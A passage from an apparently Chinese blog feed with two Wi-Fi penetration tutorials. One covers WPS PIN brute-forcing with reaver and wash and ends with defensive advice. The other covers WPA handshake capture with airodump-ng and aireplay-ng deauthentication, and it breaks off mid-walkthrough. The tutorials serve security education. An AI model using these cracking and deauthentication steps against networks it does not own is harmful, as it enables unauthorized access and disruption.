title="&emsp;PIN码采用8位数字组合，但是前四位和后四位是分别验证的，并且第八位是校验位无需关注，所以攻击者就算是暴力破解PIN码也最多只需尝试11000次不同的组合，得到正确的PIN码之后便可以通过工具提取出PSK."></a>&emsp;PIN码采用8位数字组合，但是前四位和后四位是分别验证的，并且第八位是校验位无需关注，所以攻击者就算是暴力破解PIN码也最多只需尝试11000次不同的组合，得到正确的PIN码之后便可以通过工具提取出PSK.</h4><p><img src="http://note.youdao.com/yws/public/resource/9f16df0bf97ad6892a6928427c2acd3e/xmlnote/477431D45FB048F8AD50D9C417446789/1040" alt="image"></p>
<hr>
<h2 id="0x02-WPS破解实战"><a href="#0x02-WPS破解实战" class="headerlink" title="0x02. WPS破解实战"></a>0x02. <strong>WPS破解实战</strong></h2><h4 id="emsp-emsp-由于笔者环境限制，加上破解PIN码费时费力，所以不会在本地测试，以下部分截图来自国外某大牛亲测结果。"><a href="#emsp-emsp-由于笔者环境限制，加上破解PIN码费时费力，所以不会在本地测试，以下部分截图来自国外某大牛亲测结果。" class="headerlink" title="&emsp;&emsp;由于笔者环境限制，加上破解PIN码费时费力，所以不会在本地测试，以下部分截图来自国外某大牛亲测结果。"></a>&emsp;&emsp;由于笔者环境限制，加上破解PIN码费时费力，所以不会在本地测试，以下部分截图来自国外某大牛亲测结果。</h4><h3 id="实战流程"><a href="#实战流程" class="headerlink" title="实战流程"></a>实战流程</h3><h4 id="1-关闭会影响操作的进程，启动网卡置为monitor模式"><a href="#1-关闭会影响操作的进程，启动网卡置为monitor模式" class="headerlink" title="1.关闭会影响操作的进程，启动网卡置为monitor模式"></a>1.关闭会影响操作的进程，启动网卡置为monitor模式</h4><p><img src="http://note.youdao.com/yws/public/resource/9f16df0bf97ad6892a6928427c2acd3e/xmlnote/4D2DF1CDFD874562974E89F262E80A2E/1065" alt="image"></p>
<h4 id="2-侦听周围环境中开启WPS服务的设备，下列两种方法都能达到目的"><a href="#2-侦听周围环境中开启WPS服务的设备，下列两种方法都能达到目的" class="headerlink" title="2.侦听周围环境中开启WPS服务的设备，下列两种方法都能达到目的"></a>2.侦听周围环境中开启WPS服务的设备，下列两种方法都能达到目的</h4><h4 id="1-airodump-wlan0mon-–wps-开启WPS的设备会显示如下"><a href="#1-airodump-wlan0mon-–wps-开启WPS的设备会显示如下" class="headerlink" title="(1)airodump wlan0mon –wps   开启WPS的设备会显示如下"></a>(1)airodump wlan0mon –wps   开启WPS的设备会显示如下</h4><p><img src="http://note.youdao.com/yws/public/resource/9f16df0bf97ad6892a6928427c2acd3e/xmlnote/22302CB608DD4C53BD53B8C8E04ECCCD/1081" alt="image"></p>
<h4 id="2-wash-i-wlan0mon-采用wash命令只会显示开启WPS的设备，但是会显示设备是否已经被锁上，因为有时爆破PIN码时会导致路由器被锁住"><a href="#2-wash-i-wlan0mon-采用wash命令只会显示开启WPS的设备，但是会显示设备是否已经被锁上，因为有时爆破PIN码时会导致路由器被锁住" class="headerlink" title="(2)wash -i wlan0mon 采用wash命令只会显示开启WPS的设备，但是会显示设备是否已经被锁上，因为有时爆破PIN码时会导致路由器被锁住"></a>(2)wash -i wlan0mon 采用wash命令只会显示开启WPS的设备，但是会显示设备是否已经被锁上，因为有时爆破PIN码时会导致路由器被锁住</h4><p><img src="http://note.youdao.com/yws/public/resource/9f16df0bf97ad6892a6928427c2acd3e/xmlnote/747366BE8129447DBDF876DC3C566F5C/1086" alt="image"></p>
<h4 id="3-侦听到开启WPS的设备之后我们就可以开始破解PIN码了，此时也有两种方法，一种是暴力破解，另一种是利用设备漏洞来破解PIN码"><a href="#3-侦听到开启WPS的设备之后我们就可以开始破解PIN码了，此时也有两种方法，一种是暴力破解，另一种是利用设备漏洞来破解PIN码" class="headerlink" title="3.侦听到开启WPS的设备之后我们就可以开始破解PIN码了，此时也有两种方法，一种是暴力破解，另一种是利用设备漏洞来破解PIN码"></a>3.侦听到开启WPS的设备之后我们就可以开始破解PIN码了，此时也有两种方法，一种是暴力破解，另一种是利用设备漏洞来破解PIN码</h4><h4 id="1-利用reaver爆破密码-经过几个小时的爆破基本能猜出来"><a href="#1-利用reaver爆破密码-经过几个小时的爆破基本能猜出来" class="headerlink" title="(1)利用reaver爆破密码,经过几个小时的爆破基本能猜出来"></a>(1)利用reaver爆破密码,经过几个小时的爆破基本能猜出来</h4><p><img src="http://note.youdao.com/yws/public/resource/9f16df0bf97ad6892a6928427c2acd3e/xmlnote/BB96DDDEFD6C4295BAB85DF72B562B57/1094" alt="image"></p>
<h4 id="2-利用设备漏洞破解PIN码，虽然此方法能在极短时间内完成破解，但是如果设备本身不存在漏洞依旧无法成功，下图可以看到尝试失败了"><a href="#2-利用设备漏洞破解PIN码，虽然此方法能在极短时间内完成破解，但是如果设备本身不存在漏洞依旧无法成功，下图可以看到尝试失败了" class="headerlink" title="(2)利用设备漏洞破解PIN码，虽然此方法能在极短时间内完成破解，但是如果设备本身不存在漏洞依旧无法成功，下图可以看到尝试失败了"></a>(2)利用设备漏洞破解PIN码，虽然此方法能在极短时间内完成破解，但是如果设备本身不存在漏洞依旧无法成功，下图可以看到尝试失败了</h4><p><img src="http://note.youdao.com/yws/public/resource/9f16df0bf97ad6892a6928427c2acd3e/xmlnote/A7BD48323F994067BC2F5D93D7CF99B3/1100" alt="image"></p>
<h2 id="0x03-防御措施"><a href="#0x03-防御措施" class="headerlink" title="0x03. 防御措施"></a><strong>0x03. 防御措施</strong></h2><h4 id="emsp-emsp-经过以上测试可以判定WPS是不安全的，为了防御基于WPS的攻击行为，最好的办法就是使用没有WPS功能的路由器，这是最好也是最有效的方法。另外，如果你的路由器具备WPS功能，那么就算你在网关上关闭了WPS功能也很有可能被攻击者利用，所以最好选用不具备此功能的路由器来布置到家中。"><a href="#emsp-emsp-经过以上测试可以判定WPS是不安全的，为了防御基于WPS的攻击行为，最好的办法就是使用没有WPS功能的路由器，这是最好也是最有效的方法。另外，如果你的路由器具备WPS功能，那么就算你在网关上关闭了WPS功能也很有可能被攻击者利用，所以最好选用不具备此功能的路由器来布置到家中。" class="headerlink" title="&emsp;&emsp;经过以上测试可以判定WPS是不安全的，为了防御基于WPS的攻击行为，最好的办法就是使用没有WPS功能的路由器，这是最好也是最有效的方法。另外，如果你的路由器具备WPS功能，那么就算你在网关上关闭了WPS功能也很有可能被攻击者利用，所以最好选用不具备此功能的路由器来布置到家中。"></a>&emsp;&emsp;经过以上测试可以判定WPS是不安全的，为了防御基于WPS的攻击行为，最好的办法就是使用没有WPS功能的路由器，这是最好也是最有效的方法。另外，如果你的路由器具备WPS功能，那么就算你在网关上关闭了WPS功能也很有可能被攻击者利用，所以最好选用不具备此功能的路由器来布置到家中。</h4><h2 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04. 结语"></a><strong>0x04. 结语</strong></h2><h4 id="emsp-emsp-本篇文章理论知识比较少，主要就只给大家演示了实战过程，相信喜欢速成的读者们比较喜欢吧，但是老实说这样的文章营养价值不大。碍于笔者能力有限不能给大家深度剖析协议原理深感抱歉，在之后的文章中我尽量让大家在不觉得枯燥的同时学到更多的理论原理。下一章会介绍WPA企业账号密码破解，不嫌弃的读者可以继续关注！"><a href="#emsp-emsp-本篇文章理论知识比较少，主要就只给大家演示了实战过程，相信喜欢速成的读者们比较喜欢吧，但是老实说这样的文章营养价值不大。碍于笔者能力有限不能给大家深度剖析协议原理深感抱歉，在之后的文章中我尽量让大家在不觉得枯燥的同时学到更多的理论原理。下一章会介绍WPA企业账号密码破解，不嫌弃的读者可以继续关注！" class="headerlink" title="&emsp;&emsp;本篇文章理论知识比较少，主要就只给大家演示了实战过程，相信喜欢速成的读者们比较喜欢吧，但是老实说这样的文章营养价值不大。碍于笔者能力有限不能给大家深度剖析协议原理深感抱歉，在之后的文章中我尽量让大家在不觉得枯燥的同时学到更多的理论原理。下一章会介绍WPA企业账号密码破解，不嫌弃的读者可以继续关注！"></a>&emsp;&emsp;本篇文章理论知识比较少，主要就只给大家演示了实战过程，相信喜欢速成的读者们比较喜欢吧，但是老实说这样的文章营养价值不大。碍于笔者能力有限不能给大家深度剖析协议原理深感抱歉，在之后的文章中我尽量让大家在不觉得枯燥的同时学到更多的理论原理。下一章会介绍WPA企业账号密码破解，不嫌弃的读者可以继续关注！</h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 前言&quot;&gt;&lt;/a&gt;&lt;strong&gt;0x00. 前言&lt;/strong&gt;&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-基于第一篇文章WPA密码破解的反馈，有人提问说能否写一下关于WPA2的文章。笔者在这里回答一下，破解WPA2的流程和WPA是一样的，WPA2只是采用了更加复杂可靠的加密算法（利用CCMP替代了TKIP，AES替代了RC4），不过依然可以利用上一篇文章中提到的攻击原理来暴力破解PSK，所以笔者不会再写WPA2的内容。另外，由于某些缘故WEP密码破解可能不会写了，大家见谅，不过其他内容依然会陆续推出。&quot;&gt;&lt;a href=&quot;#emsp-emsp-基于第一篇文章WPA密码破解的反馈，有人提问说能否写一下关于WPA2的文章。笔者在这里回答一下，破解WPA2的流程和WPA是一样的，WPA2只是采用了更加复杂可靠的加密算法（利用CCMP替代了TKIP，AES替代了RC4），不过依然可以利用上一篇文章中提到的攻击原理来暴力破解PSK，所以笔者不会再写WPA2的内容。另外，由于某些缘故WEP密码破解可能不会写了，大家见谅，不过其他内容依然会陆续推出。&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;基于第一篇文章WPA密码破解的反馈，有人提问说能否写一下关于WPA2的文章。笔者在这里回答一下，破解WPA2的流程和WPA是一样的，WPA2只是采用了更加复杂可靠的加密算法（利用CCMP替代了TKIP，AES替代了RC4），不过依然可以利用上一篇文章中提到的攻击原理来暴力破解PSK，所以笔者不会再写WPA2的内容。另外，由于某些缘故WEP密码破解可能不会写了，大家见谅，不过其他内容依然会陆续推出。&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;基于第一篇文章&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;amp;mid=2247484868&amp;amp;idx=1&amp;amp;sn=c9f9547e9bdb4fb9699ab47f2e307d35&amp;amp;chksm=ec1e35ecdb69bcfa42443929bac42d030adda02d1885222aa53d6b4c49b736736be97d11ae7e&amp;amp;mpshare=1&amp;amp;scene=23&amp;amp;srcid=0828jSmGdIm06mXCtMAZ6Ifq#rd&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;WPA密码破解&lt;/a&gt;的反馈，有人提问说能否写一下关于WPA2的文章。笔者在这里回答一下，破解WPA2的流程和WPA是一样的，WPA2只是采用了更加复杂可靠的加密算法（利用CCMP替代了TKIP，AES替代了RC4），不过依然可以利用上一篇文章中提到的攻击原理来暴力破解PSK，所以笔者不会再写WPA2的内容。另外，由于某些缘故WEP密码破解可能不会写了，大家见谅，不过其他内容依然会陆续推出。&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>无线渗透(上)--WPA加密</title>
    <link href="http://TimeS0ng.github.io/2017/08/30/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F(%E4%B8%8A)--WPA%E5%8A%A0%E5%AF%86/"/>
    <id>http://TimeS0ng.github.io/2017/08/30/无线渗透(上)--WPA加密/</id>
    <published>2017-08-30T15:32:55.000Z</published>
    <updated>2017-08-31T02:05:05.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-无线渗透简介"><a href="#0x00-无线渗透简介" class="headerlink" title="0x00. 无线渗透简介"></a>0x00. 无线渗透简介</h2><h4 id="emsp-emsp-在网络越来越发达的今天，相信家家户户都已经连上了无线Wi-Fi，然而在享受Wi-Fi带来的便捷性的同时，大家是否想过正是这小小的Wi-Fi却能成为黑客成功入侵计算机，盗取机密信息的踏板！？接下来笔者会写一个系列的无线渗透文章，为大家逐个分析Wi-Fi破解，破解之后黑客的攻击手段，无线AP的伪造以及中间人攻击，相信大家能在目睹Wi-Fi脆弱性的同时提高自我保护意识。此系列文章仅作技术研究，请勿他用"><a href="#emsp-emsp-在网络越来越发达的今天，相信家家户户都已经连上了无线Wi-Fi，然而在享受Wi-Fi带来的便捷性的同时，大家是否想过正是这小小的Wi-Fi却能成为黑客成功入侵计算机，盗取机密信息的踏板！？接下来笔者会写一个系列的无线渗透文章，为大家逐个分析Wi-Fi破解，破解之后黑客的攻击手段，无线AP的伪造以及中间人攻击，相信大家能在目睹Wi-Fi脆弱性的同时提高自我保护意识。此系列文章仅作技术研究，请勿他用" class="headerlink" title="&emsp;&emsp;在网络越来越发达的今天，相信家家户户都已经连上了无线Wi-Fi，然而在享受Wi-Fi带来的便捷性的同时，大家是否想过正是这小小的Wi-Fi却能成为黑客成功入侵计算机，盗取机密信息的踏板！？接下来笔者会写一个系列的无线渗透文章，为大家逐个分析Wi-Fi破解，破解之后黑客的攻击手段，无线AP的伪造以及中间人攻击，相信大家能在目睹Wi-Fi脆弱性的同时提高自我保护意识。此系列文章仅作技术研究，请勿他用!"></a>&emsp;&emsp;在网络越来越发达的今天，相信家家户户都已经连上了无线Wi-Fi，然而在享受Wi-Fi带来的便捷性的同时，大家是否想过正是这小小的Wi-Fi却能成为黑客成功入侵计算机，盗取机密信息的踏板！？接下来笔者会写一个系列的无线渗透文章，为大家逐个分析Wi-Fi破解，破解之后黑客的攻击手段，无线AP的伪造以及中间人攻击，相信大家能在目睹Wi-Fi脆弱性的同时提高自我保护意识。此系列文章仅作技术研究，请勿他用!</h4><a id="more"></a>
<h2 id="0x01-协议分析"><a href="#0x01-协议分析" class="headerlink" title="0x01. 协议分析"></a><strong>0x01. 协议分析</strong></h2><p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/9CB410665DDB4B4F98F1E69275D43BBB/699" alt="image"></p>
<h4 id="emsp-emsp-无线Wi-Fi能够传递、接受信号不仅依赖于物理硬件的支持（在物理层将数据信息转换为电子信号，通过无线电波传递到周围空气当中），更借助其上层数据链路层提供的逻辑标准来控制信息传递的有序进行。-而我们的Wi-Fi就是依赖数据链路层的802-11协议，经过多年的发展，IEEE组织已经制定了不同的协议族，正如上图所示，过去常用的是802-11b但是由于传输速度的限制现在大多数的网卡都已经开始支持802-11n-下面是笔者的Mac支持的协议。后面可能会涉及到数据包的传输过程，大家可以先去了解一下详细的802-11协议，以便更好理解后面内容。"><a href="#emsp-emsp-无线Wi-Fi能够传递、接受信号不仅依赖于物理硬件的支持（在物理层将数据信息转换为电子信号，通过无线电波传递到周围空气当中），更借助其上层数据链路层提供的逻辑标准来控制信息传递的有序进行。-而我们的Wi-Fi就是依赖数据链路层的802-11协议，经过多年的发展，IEEE组织已经制定了不同的协议族，正如上图所示，过去常用的是802-11b但是由于传输速度的限制现在大多数的网卡都已经开始支持802-11n-下面是笔者的Mac支持的协议。后面可能会涉及到数据包的传输过程，大家可以先去了解一下详细的802-11协议，以便更好理解后面内容。" class="headerlink" title="&emsp;&emsp;无线Wi-Fi能够传递、接受信号不仅依赖于物理硬件的支持（在物理层将数据信息转换为电子信号，通过无线电波传递到周围空气当中），更借助其上层数据链路层提供的逻辑标准来控制信息传递的有序进行。 而我们的Wi-Fi就是依赖数据链路层的802.11协议，经过多年的发展，IEEE组织已经制定了不同的协议族，正如上图所示，过去常用的是802.11b但是由于传输速度的限制现在大多数的网卡都已经开始支持802.11n,下面是笔者的Mac支持的协议。后面可能会涉及到数据包的传输过程，大家可以先去了解一下详细的802.11协议，以便更好理解后面内容。"></a>&emsp;&emsp;无线Wi-Fi能够传递、接受信号不仅依赖于物理硬件的支持（在物理层将数据信息转换为电子信号，通过无线电波传递到周围空气当中），更借助其上层数据链路层提供的逻辑标准来控制信息传递的有序进行。 而我们的Wi-Fi就是依赖数据链路层的802.11协议，经过多年的发展，IEEE组织已经制定了不同的协议族，正如上图所示，过去常用的是802.11b但是由于传输速度的限制现在大多数的网卡都已经开始支持802.11n,下面是笔者的Mac支持的协议。后面可能会涉及到数据包的传输过程，大家可以先去了解一下<a href="http://blog.csdn.net/cupidove/article/details/23122213" target="_blank" rel="external">详细的802.11协议</a>，以便更好理解后面内容。</h4><p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/5DD04579426246628D480168D104711B/748" alt="image"></p>
<hr>
<h2 id="0x02-WPA简介"><a href="#0x02-WPA简介" class="headerlink" title="0x02. WPA简介"></a><strong>0x02. WPA简介</strong></h2><h4 id="emsp-emsp-无线通信中WPA是目前个人用户用得最广的加密协议，企业用的最广的是WPA2，而WEP加密因为被认为很不安全，所以很少会有使用，但是也存在极少个例不太懂安全的人使用，后面的文章都会有介绍。本文笔者先从WPA的攻击开始介绍。"><a href="#emsp-emsp-无线通信中WPA是目前个人用户用得最广的加密协议，企业用的最广的是WPA2，而WEP加密因为被认为很不安全，所以很少会有使用，但是也存在极少个例不太懂安全的人使用，后面的文章都会有介绍。本文笔者先从WPA的攻击开始介绍。" class="headerlink" title="&emsp;&emsp;无线通信中WPA是目前个人用户用得最广的加密协议，企业用的最广的是WPA2，而WEP加密因为被认为很不安全，所以很少会有使用，但是也存在极少个例不太懂安全的人使用，后面的文章都会有介绍。本文笔者先从WPA的攻击开始介绍。"></a>&emsp;&emsp;无线通信中WPA是目前个人用户用得最广的加密协议，企业用的最广的是WPA2，而WEP加密因为被认为很不安全，所以很少会有使用，但是也存在极少个例不太懂安全的人使用，后面的文章都会有介绍。本文笔者先从WPA的攻击开始介绍。</h4><hr>
<h2 id="0x03-WPA密钥交换流程"><a href="#0x03-WPA密钥交换流程" class="headerlink" title="0x03. WPA密钥交换流程"></a><strong>0x03. WPA密钥交换流程</strong></h2><p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/003B6F229A3244159C233A04F3D76503/756" alt="image"></p>
<h3 id="emsp-emsp-虽然WPA加密算法十分安全可靠，但是在密钥交换时却不能保证握手过程不被黑客嗅探到。如上图所示，WPA密钥交换要经过四步握手过程，这和TCP握手类似"><a href="#emsp-emsp-虽然WPA加密算法十分安全可靠，但是在密钥交换时却不能保证握手过程不被黑客嗅探到。如上图所示，WPA密钥交换要经过四步握手过程，这和TCP握手类似" class="headerlink" title="&emsp;&emsp;虽然WPA加密算法十分安全可靠，但是在密钥交换时却不能保证握手过程不被黑客嗅探到。如上图所示，WPA密钥交换要经过四步握手过程，这和TCP握手类似"></a>&emsp;&emsp;虽然WPA加密算法十分安全可靠，但是在密钥交换时却不能保证握手过程不被黑客嗅探到。如上图所示，WPA密钥交换要经过四步握手过程，这和TCP握手类似</h3><h4 id="emsp-emsp-1-首先由AP-可以通俗理解为Wi-Fi-发送ANonce给STATION-客户端-；"><a href="#emsp-emsp-1-首先由AP-可以通俗理解为Wi-Fi-发送ANonce给STATION-客户端-；" class="headerlink" title="&emsp;&emsp;1.首先由AP(可以通俗理解为Wi-Fi)发送ANonce给STATION(客户端)；"></a>&emsp;&emsp;1.首先由AP(可以通俗理解为Wi-Fi)发送ANonce给STATION(客户端)；</h4><h4 id="emsp-emsp-2-STA接收到ANonce之后利用正确的Essid-Wi-Fi名称-和PSK-共享密钥，即密码-经过迭代算法计算出PMK，然后STA再自己生成一个SNonce，此时STA同时拥有ANonce、SNonce、PMK、AP-MAC、STA-MAC，利用这些已知信息STA经过散列算法就可以计算出PTK（密钥流，后续就用PTK来加密数据包），接下来STA就把SNonce和PTK的MIC值发送给AP；"><a href="#emsp-emsp-2-STA接收到ANonce之后利用正确的Essid-Wi-Fi名称-和PSK-共享密钥，即密码-经过迭代算法计算出PMK，然后STA再自己生成一个SNonce，此时STA同时拥有ANonce、SNonce、PMK、AP-MAC、STA-MAC，利用这些已知信息STA经过散列算法就可以计算出PTK（密钥流，后续就用PTK来加密数据包），接下来STA就把SNonce和PTK的MIC值发送给AP；" class="headerlink" title="&emsp;&emsp;2.STA接收到ANonce之后利用正确的Essid(Wi-Fi名称)和PSK(共享密钥，即密码)经过迭代算法计算出PMK，然后STA再自己生成一个SNonce，此时STA同时拥有ANonce、SNonce、PMK、AP MAC、STA MAC，利用这些已知信息STA经过散列算法就可以计算出PTK（密钥流，后续就用PTK来加密数据包），接下来STA就把SNonce和PTK的MIC值发送给AP；"></a>&emsp;&emsp;2.STA接收到ANonce之后利用正确的Essid(Wi-Fi名称)和PSK(共享密钥，即密码)经过迭代算法计算出PMK，然后STA再自己生成一个SNonce，此时STA同时拥有ANonce、SNonce、PMK、AP MAC、STA MAC，利用这些已知信息STA经过散列算法就可以计算出PTK（密钥流，后续就用PTK来加密数据包），接下来STA就把SNonce和PTK的MIC值发送给AP；</h4><h4 id="emsp-emsp-3-AP拿到SNonce之后也拥有了ANonce、SNonce、PMK、AP-MAC、STA-MAC（AP也可以生成PMK），得到这些信息之后AP也计算出PTK，通过比较PTK的MIC值来判断密码是否正确和数据是否被篡改，接下来由AP发送GTK和MIC值给STA；"><a href="#emsp-emsp-3-AP拿到SNonce之后也拥有了ANonce、SNonce、PMK、AP-MAC、STA-MAC（AP也可以生成PMK），得到这些信息之后AP也计算出PTK，通过比较PTK的MIC值来判断密码是否正确和数据是否被篡改，接下来由AP发送GTK和MIC值给STA；" class="headerlink" title="&emsp;&emsp;3.AP拿到SNonce之后也拥有了ANonce、SNonce、PMK、AP MAC、STA MAC（AP也可以生成PMK），得到这些信息之后AP也计算出PTK，通过比较PTK的MIC值来判断密码是否正确和数据是否被篡改，接下来由AP发送GTK和MIC值给STA；"></a>&emsp;&emsp;3.AP拿到SNonce之后也拥有了ANonce、SNonce、PMK、AP MAC、STA MAC（AP也可以生成PMK），得到这些信息之后AP也计算出PTK，通过比较PTK的MIC值来判断密码是否正确和数据是否被篡改，接下来由AP发送GTK和MIC值给STA；</h4><h4 id="emsp-emsp-4-STA也要通过比对MIC值来判断数据是否被篡改，如果MIC值相同则回送一个用密钥加密过的ACK给AP确定，此时密钥交换完成。"><a href="#emsp-emsp-4-STA也要通过比对MIC值来判断数据是否被篡改，如果MIC值相同则回送一个用密钥加密过的ACK给AP确定，此时密钥交换完成。" class="headerlink" title="&emsp;&emsp;4.STA也要通过比对MIC值来判断数据是否被篡改，如果MIC值相同则回送一个用密钥加密过的ACK给AP确定，此时密钥交换完成。"></a>&emsp;&emsp;4.STA也要通过比对MIC值来判断数据是否被篡改，如果MIC值相同则回送一个用密钥加密过的ACK给AP确定，此时密钥交换完成。</h4><hr>
<h2 id="0x04-WPA-PSK攻击原理"><a href="#0x04-WPA-PSK攻击原理" class="headerlink" title="0x04. WPA PSK攻击原理"></a><strong>0x04. WPA PSK攻击原理</strong></h2><h4 id="emsp-emsp-上面介绍了WPA密钥交换原理，而我们的攻击过程正是要利用这个原理来实现的，所以笔者希望大家能够试图看懂上面介绍的原理流程。"><a href="#emsp-emsp-上面介绍了WPA密钥交换原理，而我们的攻击过程正是要利用这个原理来实现的，所以笔者希望大家能够试图看懂上面介绍的原理流程。" class="headerlink" title="&emsp;&emsp;上面介绍了WPA密钥交换原理，而我们的攻击过程正是要利用这个原理来实现的，所以笔者希望大家能够试图看懂上面介绍的原理流程。"></a>&emsp;&emsp;上面介绍了WPA密钥交换原理，而我们的攻击过程正是要利用这个原理来实现的，所以笔者希望大家能够试图看懂上面介绍的原理流程。</h4><h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><h4 id="emsp-1-利用抓包工具抓取四步握手过程；"><a href="#emsp-1-利用抓包工具抓取四步握手过程；" class="headerlink" title="&emsp;1.利用抓包工具抓取四步握手过程；"></a>&emsp;1.利用抓包工具抓取四步握手过程；</h4><h4 id="emsp-2-抓取到四步握手之后我们便得到了ANonce、SNonce、Essid、AP-MAC、STA-MAC、MIC-因为PMK-Essid-PSK-迭代计算，所以我们可以尝试用字典来计算出各种PMK，然后生成PTK-MIC值-PTK-MIC-ANonce-SNonce-PMK-AP-MAC-STA-MAC-散列计算-比较抓取到的MIC值，其实这个过程和破解hash是一个道理，主要依赖字典。"><a href="#emsp-2-抓取到四步握手之后我们便得到了ANonce、SNonce、Essid、AP-MAC、STA-MAC、MIC-因为PMK-Essid-PSK-迭代计算，所以我们可以尝试用字典来计算出各种PMK，然后生成PTK-MIC值-PTK-MIC-ANonce-SNonce-PMK-AP-MAC-STA-MAC-散列计算-比较抓取到的MIC值，其实这个过程和破解hash是一个道理，主要依赖字典。" class="headerlink" title="&emsp;2.抓取到四步握手之后我们便得到了ANonce、SNonce、Essid、AP MAC、STA MAC、MIC,因为PMK=Essid + PSK + 迭代计算，所以我们可以尝试用字典来计算出各种PMK，然后生成PTK MIC值(PTK MIC = ANonce + SNonce + PMK + AP MAC + STA MAC + 散列计算)比较抓取到的MIC值，其实这个过程和破解hash是一个道理，主要依赖字典。"></a>&emsp;2.抓取到四步握手之后我们便得到了ANonce、SNonce、Essid、AP MAC、STA MAC、MIC,因为PMK=Essid + PSK + 迭代计算，所以我们可以尝试用字典来计算出各种PMK，然后生成PTK MIC值(PTK MIC = ANonce + SNonce + PMK + AP MAC + STA MAC + 散列计算)比较抓取到的MIC值，其实这个过程和破解hash是一个道理，主要依赖字典。</h4><hr>
<h2 id="0x05-WPA攻击实战"><a href="#0x05-WPA攻击实战" class="headerlink" title="0x05. WPA攻击实战"></a><strong>0x05. WPA攻击实战</strong></h2><h4 id="emsp-emsp-介绍了这么多，相信大家已经摩拳擦掌，准备拿自己的Wi-Fi下手了，下面笔者演示实操攻破自己的Wi-Fi。"><a href="#emsp-emsp-介绍了这么多，相信大家已经摩拳擦掌，准备拿自己的Wi-Fi下手了，下面笔者演示实操攻破自己的Wi-Fi。" class="headerlink" title="&emsp;&emsp;介绍了这么多，相信大家已经摩拳擦掌，准备拿自己的Wi-Fi下手了，下面笔者演示实操攻破自己的Wi-Fi。"></a>&emsp;&emsp;介绍了这么多，相信大家已经摩拳擦掌，准备拿自己的Wi-Fi下手了，下面笔者演示实操攻破自己的Wi-Fi。</h4><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="emsp-1-kali-Linux虚拟机"><a href="#emsp-1-kali-Linux虚拟机" class="headerlink" title="&emsp;1.kali Linux虚拟机"></a>&emsp;1.kali Linux虚拟机</h4><h4 id="emsp-2-TL-WN722N网卡"><a href="#emsp-2-TL-WN722N网卡" class="headerlink" title="&emsp;2.TL-WN722N网卡"></a>&emsp;2.TL-WN722N网卡</h4><h4 id="emsp-3-Wi-Fi密码为admin123的路由器"><a href="#emsp-3-Wi-Fi密码为admin123的路由器" class="headerlink" title="&emsp;3.Wi-Fi密码为admin123的路由器"></a>&emsp;3.Wi-Fi密码为admin123的路由器</h4><p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/63067782993749B08166DC5D3FE8BEA2/883" alt="image"><br><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/135817F3256741E6A946E1B9706C27AD/913" alt="image"></p>
<h3 id="操作流程"><a href="#操作流程" class="headerlink" title="操作流程"></a>操作流程</h3><h4 id="emsp-1-启动kali-Linux虚拟机，映射网卡"><a href="#emsp-1-启动kali-Linux虚拟机，映射网卡" class="headerlink" title="&emsp;1.启动kali Linux虚拟机，映射网卡"></a>&emsp;1.启动kali Linux虚拟机，映射网卡</h4><p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/F2E877559EA14CD9A3D22AF94B5DE207/891" alt="image"></p>
<h4 id="emsp-2-启动网卡，设置为monitor模式"><a href="#emsp-2-启动网卡，设置为monitor模式" class="headerlink" title="&emsp;2.启动网卡，设置为monitor模式"></a>&emsp;2.启动网卡，设置为monitor模式</h4><p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/95502CABB90F4DF79FA602AE292801C9/909" alt="image"></p>
<h4 id="emsp-3-启动airodump-ng进行抓包侦听-airodump-ng-c-–essid-w-wpa"><a href="#emsp-3-启动airodump-ng进行抓包侦听-airodump-ng-c-–essid-w-wpa" class="headerlink" title="&emsp;3.启动airodump-ng进行抓包侦听(airodump-ng  -c  –essid  -w wpa)"></a>&emsp;3.启动airodump-ng进行抓包侦听(airodump-ng <interface> -c <channel> –essid <essid name=""> -w wpa)</essid></channel></interface></h4><p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/7DC28669142B44EEBFB4F75AD6887744/918" alt="image"></p>
<h4 id="emsp-4-利用aireplay-ng-aireplay-0-3-a-c-迫使MAC为-98-01-A7-C5-F7-6D的主机下线重连Wi-Fi，以便抓取四步握手"><a href="#emsp-4-利用aireplay-ng-aireplay-0-3-a-c-迫使MAC为-98-01-A7-C5-F7-6D的主机下线重连Wi-Fi，以便抓取四步握手" class="headerlink" title="&emsp;4.利用aireplay-ng(aireplay -0 3 -a  -c  迫使MAC为 98:01:A7:C5:F7:6D的主机下线重连Wi-Fi，以便抓取四步握手"></a>&emsp;4.利用aireplay-ng(aireplay -0 3 -a <ap mac=""> -c <sta mac=""> <interface>迫使MAC为 98:01:A7:C5:F7:6D的主机下线重连Wi-Fi，以便抓取四步握手</interface></sta></ap></h4><p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/1AF5BBD248E54CB8AB60B5D4F144D421/926" alt="image"></p>
